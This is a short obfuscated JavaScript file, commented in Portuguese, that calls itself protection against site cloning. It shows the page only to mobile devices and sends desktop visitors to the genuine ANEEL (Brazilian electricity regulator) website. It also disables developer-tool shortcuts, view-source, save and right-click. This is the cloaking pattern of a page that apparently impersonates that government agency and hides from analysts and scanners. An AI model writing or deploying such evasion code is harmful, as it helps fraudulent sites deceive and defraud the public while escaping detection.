/**
 * Script de segurança para proteção imediata do site contra clonagem
 * Este script é carregado antes mesmo do React e aplica proteções básicas
 */

(function() {
  var _0x4d8e=['toString','constructor','while\x20(true)\x20{}','counter','length','apply','return\x20(function()\x20','userAgent','test','Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera\x20Mini','ontouchstart','orientation','_dvt','parse','setItem','https://antigo.aneel.gov.br/','addEventListener','keydown','keyCode','ctrlKey','shiftKey','preventDefault','log','Proteção\x20inicial\x20ativada.'];
  
  // Função de detecção de mobile (ofuscada)
  function _0x2c4f() {
    var _0x5d10a6 = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i[_0x4d8e[8]](navigator[_0x4d8e[7]]);
    var _0x32e7a8 = _0x4d8e[10] in window || navigator.maxTouchPoints > 0;
    var _0x1e0b1c = typeof window[_0x4d8e[11]] !== 'undefined';
    var _0x2bdd6b = (_0x5d10a6 && _0x32e7a8) || _0x1e0b1c;
    
    try {
      var _0x40b86d = localStorage.getItem(_0x4d8e[12]);
      if (_0x40b86d !== null) {
        return JSON[_0x4d8e[13]](_0x40b86d || 'false');
      }
    } catch (_0x48a1bc) {}
    
    try {
      localStorage[_0x4d8e[14]](_0x4d8e[12], JSON.stringify(_0x2bdd6b));
    } catch (_0x1dd098) {}
    
    return _0x2bdd6b;
  }
  
  // Redirecionar para ANEEL se não for dispositivo móvel
  if (!_0x2c4f()) {
    window.location.href = _0x4d8e[15];
  }
  
  // Bloquear atalhos de teclado comuns para inspeção
  document[_0x4d8e[16]](_0x4d8e[17], function(_0x2b6a88) {
    if (
      _0x2b6a88[_0x4d8e[18]] === 123 || // F12
      (_0x2b6a88[_0x4d8e[19]] && _0x2b6a88[_0x4d8e[20]] && _0x2b6a88[_0x4d8e[18]] === 73) || // Ctrl+Shift+I
      (_0x2b6a88[_0x4d8e[19]] && _0x2b6a88[_0x4d8e[18]] === 85) || // Ctrl+U
      (_0x2b6a88[_0x4d8e[19]] && _0x2b6a88[_0x4d8e[18]] === 83) // Ctrl+S
    ) {
      _0x2b6a88[_0x4d8e[21]]();
      return false;
    }
  });
  
  // Adicionar proteção contra clique direito
  document[_0x4d8e[16]]('contextmenu', function(_0x41da83) {
    _0x41da83[_0x4d8e[21]]();
    return false;
  });
  
  // Mensagem para debug
  console[_0x4d8e[22]](_0x4d8e[23]);
})();